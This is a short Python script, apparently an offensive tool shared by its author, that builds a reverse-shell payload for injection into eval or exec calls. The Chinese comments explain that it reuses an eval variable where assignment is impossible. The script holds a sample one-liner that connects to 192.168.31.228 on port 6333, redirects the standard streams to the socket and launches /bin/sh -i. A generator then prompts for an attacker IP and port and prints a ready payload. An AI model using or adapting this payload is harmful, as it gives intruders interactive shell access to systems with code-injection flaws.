#by leeya_bug

#使用eval将变量重复利用，适用于无法赋值变量的场景
#适用于eval、exec等函数

#Payload: 
if False:
    eval("str(a.connect(('192.168.31.228',6333)))+str(__import__('os').dup2(a.fileno(),0))+str(__import__('os').dup2(a.fileno(),1))+str(__import__('os').dup2(a.fileno(),2))+str(__import__('subprocess').call(['/bin/sh','-i']))",{'a':__import__('socket').socket(__import__('socket').AF_INET, __import__('socket').SOCK_STREAM)})

#Payload生成
IP = input('请输入控制端IP: ')
PORT = input('请输入控制端端口: ')
print('''eval("str(a.connect((\''''+ IP +'''\',''' + PORT + ''')))+str(__import__('os').dup2(a.fileno(),0))+str(__import__('os').dup2(a.fileno(),1))+str(__import__('os').dup2(a.fileno(),2))+str(__import__('subprocess').call(['/bin/sh','-i']))",{'a':__import__('socket').socket(__import__('socket').AF_INET, __import__('socket').SOCK_STREAM)})''')
